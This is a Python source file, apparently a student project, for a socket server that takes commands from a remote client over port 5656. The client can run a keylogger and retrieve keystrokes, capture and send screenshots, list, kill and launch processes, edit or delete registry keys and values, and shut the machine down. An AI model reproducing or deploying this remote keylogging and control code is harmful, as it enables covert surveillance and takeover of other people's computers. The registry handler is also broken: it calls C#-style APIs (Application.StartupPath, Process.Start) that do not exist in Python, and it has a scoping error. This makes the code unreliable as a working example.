import socket
import os
import sys
import winreg as reg
import subprocess
import io
import threading
import mss
import psutil
import base64
import tkinter as tk
import PIL.Image
import time
from tkinter import messagebox
from Keylog import InterceptKeys, appstart
from pynput import keyboard
from io import BytesIO
from Program import Program


class Server(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Server")
        self.geometry("300x200")

        self.start_button = tk.Button(self, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=20)

        self.stop_button = tk.Button(self, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def start_server(self):
        Program.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Program.server.bind(('', 5656))
        Program.server.listen(100)
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        print("Server started, waiting for client...")
        print("IP Address:", ip_address)

        Program.client, addr = Program.server.accept()
        Program.ns = Program.client.makefile('rwb')

        print("Client connected at:", addr)

        Program.nr = io.TextIOWrapper(Program.ns, encoding='utf-8')
        Program.nw = io.TextIOWrapper(Program.ns, encoding='utf-8')

        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.handle_data()

    def stop_server(self):
        Program.nr.close()
        Program.nw.close()
        Program.ns.close()
        Program.client.close()
        Program.server.close()

        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def receive_data(self):
        try:
            print('Receiving data...')
            data = Program.nr.readline()
            print('Received '+data)
            return data.strip()
        except Exception as e:
            print('Error while receiving data:', str(e))
            return "QUIT"

    def handle_data(self):
        print('Handling data...')
        while True:
            data = self.receive_data()
            print(data)
            if data == "KEYLOG":
                self.keylog()
            elif data == "SHUTDOWN":
                self.shutdown()
            elif data == "REGISTRY":
                self.registry()
            elif data == "TAKEPIC":
                self.takepic()
            elif data == "PROCESS":
                self.process()
            elif data == "APPLICATION":
                self.application()
            elif data == "QUIT":
                break
            else:
                print('Unknown command: ', data);
                break

        Program.client.shutdown(socket.SHUT_RDWR)
        Program.client.close()
        pass

    def on_closing(self):
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            if (Program.client != None):
                self.stop_server()
            self.destroy()

    def shutdown(self):
        seconds = 30
        hostname = socket.gethostname()
        message = "The system is shutting down. Please save all work in progress and log off. Any unsaved changes will be lost. This shutdown was initiated by " + hostname + "\n" 
        messagebox.showinfo("Shutdown", message)
        if os.name == "nt":  # For Windows
            os.system("C:\\Windows\\System32\\shutdown.exe /s /t 60")
        elif os.name == "posix":  # For Linux or macOS
            os.system("shutdown now")
        else:
            print("Unsupported operating system.")

    def hook_key(self):
        InterceptKeys.startKLog()
        # with open(appstart.path, "w") as file:
        #     file.write("")

    def unhook(self):
        InterceptKeys.stopKLog()

    def print_keys(self):
        s = appstart.strLog()
        with open(appstart.path, "w") as file:
            file.write("")
        if s == "":
            s = "\0"
        Program.nw.write(s + '\n')
        Program.nw.flush()

    def keylog(self):
        while True:
            s = self.receive_signal()
            InterceptKeys.listener = keyboard.Listener(on_press=InterceptKeys.onKeyPress, on_release=InterceptKeys.onKeyRelease)
            if s == "PRINT":
                print(s)
                self.print_keys()
            elif s == "HOOK":
                print(s)
                self.hook_key()
            elif s == "UNHOOK":
                print(s)
                self.unhook()
            elif s == "QUIT":
                print(s)
                self.unhook()
                break

    def takepic(self):
        while True:
            try:
                cmd = self.receive_signal()
                print(cmd)
                if (cmd == "PIC"):
                    with mss.mss() as sct:
                        print("Capture image")
                        monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
                        screenshot = sct.grab(monitor)

                        image_PIL = PIL.Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                        image_stream = BytesIO()
                        image_PIL.save(image_stream, format="PNG")
                        image_PIL.save("screenshot.png", format="PNG")

                    
                    image_bytes = image_stream.getvalue()

                    print("Send image size")

                    Program.nw.write('SIZE %s \n' % len(image_bytes))
                    Program.nw.flush()

                    print("SENT")

                    answer = Program.client.recv(4096).strip()
                    print('answer = %s' % answer)

                    # Wait for server's acknowledgment
                    if answer == b"GOT SIZE":
                        print("Send image")
                        Program.client.sendall(image_bytes)

                        # Receive and concatenate the server's response
                        response = Program.client.recv(4096).strip()
                        print('answer = %s' % response)
                        if response == b"GOT IMAGE":
                            Program.nw.write("BYE BYE")
                            Program.nw.flush()
                            print('Image successfully sent to the server')
                        else:
                            raise Exception("Something went wrong.")
                elif cmd == "QUIT":
                    break
                else:
                    pass
            except Exception as e:
                print('Error occurred:', str(e))

    def process(self):
        while True:
            ss = self.receive_signal()
            print(ss)

            if ss == "XEM":
                try:
                    process_list = []
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            process = psutil.Process(proc.pid)
                            process_name = process.name()  # Retrieve the process name
                            num_threads = process.num_threads()  # Retrieve the number of threads associated with the process
                            process_list.append((process_name, proc.pid, num_threads))
                        except (psutil.AccessDenied, psutil.NoSuchProcess) as e:
                            print("Error retrieving process information:", str(e))
                        except psutil.Error as e:
                            print("Error occurred while retrieving process information:", str(e))
                    Program.nw.write('SOPROCESS\n')
                    Program.nw.flush()
                    cmd = Program.nr.readline().strip()
                    if cmd == "no":
                        raise Exception("Something went wrong. Please try again.")
                    else:
                        Program.nw.write(str(len(process_list)) + '\n')
                        Program.nw.flush()
                        for process_name, pid, num_threads in process_list:
                            Program.nw.write(process_name + '\n')
                            Program.nw.flush()
                            Program.nw.write(str(pid) + '\n')  # Convert pid to string before writing
                            Program.nw.flush()
                            Program.nw.write(str(num_threads) + '\n')  # Convert num_threads to string before writing
                            Program.nw.flush()
                except Exception as e:
                    messagebox.showerror("Error", f"Error retrieving process: {e}")
            elif ss == "KILL":
                try:
                    while True:
                        cmd = Program.nr.readline().strip()
                        if cmd == "KILLID":
                            Program.nw.write('ok\n')
                            Program.nw.flush()
                            pid = int(Program.nr.readline().strip())
                            try:
                                process = psutil.Process(pid)
                                process.terminate()
                                messagebox.showinfo("Success", "Process with PID {} has been terminated.".format(pid))
                            except psutil.NoSuchProcess:
                                messagebox.showerror('Error', f'No such process: {pid}')
                        elif (cmd == "QUIT"):
                            break
                        else:
                            Program.nw.write('no\n')
                            Program.nw.flush()
                            raise Exception("Invalid command")
                except Exception as e:
                    messagebox.showerror('Error', f'Error terminating process: {e}')
            elif ss == "START":
                try:
                    while True:
                        cmd = Program.nr.readline().strip()
                        if (cmd == "TENPROCESS"):
                            process_name = Program.nr.readline().strip()
                            print("Starting app " + process_name)
                            subprocess.Popen(process_name)
                            messagebox.showinfo("Success",f"Started application: {process_name}")
                        elif (cmd == "QUIT"):
                            break
                        else:
                            Program.nw.write('no\n')
                            Program.nw.flush()
                            raise Exception("Invalid command")
                except FileNotFoundError:
                        print(f"Application '{process_name}' not found")
                        messagebox.showerror("Error",f"Application '{process_name}' not found\n")
                except Exception as e:
                    print(f"Error occurred while starting application: {e}")
                    messagebox.showerror("Error",f"Error occurred while starting application: {e}\n")
            elif ss == "QUIT":
                break
            else:
                pass

    def application(self):
        ss = ""
        pr = []
        while True:
            ss = self.receive_signal()
            print(ss)
            if ss == "XEM":   
                try:
                    app_list = []
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            app = psutil.Process(proc.pid)
                            app_name = app.name()  # Retrieve the application name
                            num_threads = app.num_threads()  # Retrieve the number of threads associated with the application
                            app_list.append((app_name, proc.pid, num_threads))
                        except (psutil.AccessDenied, psutil.NoSuchProcess) as e:
                            print("Error retrieving application information:", str(e))

                    Program.nw.write('SOPROCESS\n');
                    Program.nw.flush()
                    cmd = Program.nr.readline().strip();
                    if (cmd == "no"):
                        raise Exception("Something went wrong. Please try again.")
                    else:
                        Program.nw.write(str(len(app_list))+'\n');
                        Program.nw.flush()
                        for app_name, pid, num_threads in app_list:
                            Program.nw.write(app_name + '\n')
                            Program.nw.flush()
                            Program.nw.write(str(pid) + '\n')  # Convert pid to string before writing
                            Program.nw.flush()
                            Program.nw.write(str(num_threads) + '\n')  # Convert num_threads to string before writing
                            Program.nw.flush()
                except Exception as e:
                    messagebox.showerror("Error",f"Error retrieving application:{e}")
            elif ss == "KILL":
                try:
                    while True:
                        cmd = Program.nr.readline().strip();
                        if (cmd == "KILLID"):
                            Program.nw.write('ok\n')
                            Program.nw.flush()
                            pid = int(Program.nr.readline().strip())
                            process = psutil.Process(pid)
                            process.terminate()
                            messagebox.showinfo("Success", "Application with PID {} has been terminated.".format(pid))
                        elif (cmd == "QUIT"):
                            break
                        else:
                            Program.nw.write('no\n')
                            Program.nw.flush()
                            raise Exception("Invalid command")
                except psutil.NoSuchProcess:
                    messagebox.showerror('Error', f'No such application:{pid}')
                except Exception as e:
                    messagebox.showerror('Error', f'Error terminating application:{e}')
            elif ss == "START":
                try:
                    while True:
                        cmd = Program.nr.readline().strip()
                        if (cmd == "TENPROCESS"):
                            app_name = Program.nr.readline().strip()
                            print("Starting app " + app_name)
                            subprocess.Popen(app_name)
                            messagebox.showinfo("Success",f"Started application: {app_name}")
                        elif (cmd == "QUIT"):
                            break
                        else:
                            Program.nw.write('no\n')
                            Program.nw.flush()
                            raise Exception("Invalid command")
                except FileNotFoundError:
                    print(f"Application '{app_name}' not found")
                    messagebox.showerror("Error",f"Application '{app_name}' not found\n")
                except Exception as e:
                    print(f"Error occurred while starting application: {e}")
                    messagebox.showerror("Error",f"Error occurred while starting application: {e}\n")
            elif ss == "QUIT":
                break
            else:
                pass

    def receive_signal(self):
        signal = Program.nr.readline().strip()
        return signal

    def baseRegistryKey(self, link):
        a = None
        print(link)
        if "\\" in link:
            key = link.split("\\")[0].upper()
            print(key)
            if key == "HKEY_CLASSES_ROOT":
                a = reg.HKEY_CLASSES_ROOT
            elif key == "HKEY_CURRENT_USER":
                a = reg.HKEY_CURRENT_USER
            elif key == "HKEY_LOCAL_MACHINE":
                a = reg.HKEY_LOCAL_MACHINE
            elif key == "HKEY_USERS":
                a = reg.HKEY_USERS
            elif key == "HKEY_CURRENT_CONFIG":
                a = reg.HKEY_CURRENT_CONFIG
        return a

    def getvalue(self, a, link, valueName):
        try:
            a = reg.OpenKey(a, link)
        except Exception as ex:
            return ("Lỗi:" + str(ex))
        
        if a is None:
            return ("Lỗi:" + str(ex))
        
        try:
            op, type_ = reg.QueryValueEx(a, valueName)
        except Exception as ex:
            return ("Lỗi:" + str(ex))
        
        s = ""
        if type_ == reg.REG_MULTI_SZ:
            s = " ".join(op)
        elif type_ == reg.REG_BINARY:
            s = " ".join(str(byte) for byte in op)
        else:
            s = str(op)
        
        return s

    def setvalue(self, a, link, valueName, value, typeValue):
        try:
            a = reg.OpenKey(a, link, 0, reg.KEY_SET_VALUE)
        except Exception as ex:
            return "Lỗi"
        
        if a is None:
            return "Lỗi"
        
        kind = None
        if typeValue == "String":
            kind = reg.REG_SZ
        elif typeValue == "Binary":
            kind = reg.REG_BINARY
        elif typeValue == "DWORD":
            kind = reg.REG_DWORD
        elif typeValue == "QWORD":
            kind = reg.REG_QWORD
        elif typeValue == "Multi-String":
            kind = reg.REG_MULTI_SZ
        elif typeValue == "Expandable String":
            kind = reg.REG_EXPAND_SZ
        else:
            return "Lỗi"
        
        try:
            if kind == reg.REG_DWORD:
                value = int(value)
            elif kind == reg.REG_QWORD:
                value = int(value)
            elif kind == reg.REG_MULTI_SZ:
                value = value.split()
            reg.SetValueEx(a, valueName, 0, kind, value)
        except Exception as ex:
            return "Lỗi"
        
        return "Set value thành công"

    def deletevalue(self, a, link, valueName):
        try:
            a = reg.OpenKey(a, link, 0, reg.KEY_SET_VALUE)
        except Exception as ex:
            return "Lỗi"
        
        if a is None:
            return "Lỗi"
        
        try:
            reg.DeleteValue(a, valueName)
        except Exception as ex:
            return "Lỗi"
        
        return "Xóa value thành công"

    def deletekey(self, a, link):
        try:
            reg.DeleteKey(a, link)
        except Exception as ex:
            return "Lỗi"
        
        return "Xóa key thành công"

    def registry(self):
        s = ""
        fs = open("fileReg.reg", "w")
        fs.close()

        while True:
            s = self.receive_signal()
            print(s)
            if s == "REG":
                data = [''] * 5000
                Program.nr.read(data, 0, 5000)
                s = ''.join(data)
                fin = open("fileReg.reg", "w")
                fin.write(s)
                fin.close()
                s = Application.StartupPath + "\\fileReg.reg"
                test = True
                try:
                    regeditPro = Process.Start("regedit.exe", "/s " + "\"" + s + "\"")
                    regeditPro.WaitForExit(20)
                except Exception as ex:
                    test = True
                if test:
                    Program.nw.write("Sửa thành công\n")
                else:
                    Program.nw.write("Sửa thất bại\n")
                Program.nw.flush()
            elif s == "QUIT":
                return
            elif s == "SEND":
                option = ""
                link = ""
                valueName = ""
                value = ""
                typeValue = ""
                option = Program.nr.readline().strip()
                link = Program.nr.readline().strip()
                valueName = Program.nr.readline().strip()
                value = Program.nr.readline().strip()
                typeValue = Program.nr.readline().strip()

                a = self.baseRegistryKey(link)
                link2 = link.split('\\', 1)[-1]
                if a == None:
                    s = "Lỗi"
                else:
                    if option == "Create key":
                        a = reg.CreateKey(a, link2)
                        s = "Tạo key thành công"
                    elif option == "Delete key":
                        s = self.deletekey(a, link2)
                    elif option == "Get value":
                        s = self.getvalue(a, link2, valueName)
                    elif option == "Set value":
                        s = self.setvalue(a, link2, valueName, value, typeValue)
                    elif option == "Delete value":
                        s = self.deletevalue(a, link2, valueName)
                    else:
                        s = "Lỗi"
                print(a)
                Program.nw.write(s + '\n')
                Program.nw.flush()


if __name__ == "__main__":
    server = Server()
    server.mainloop()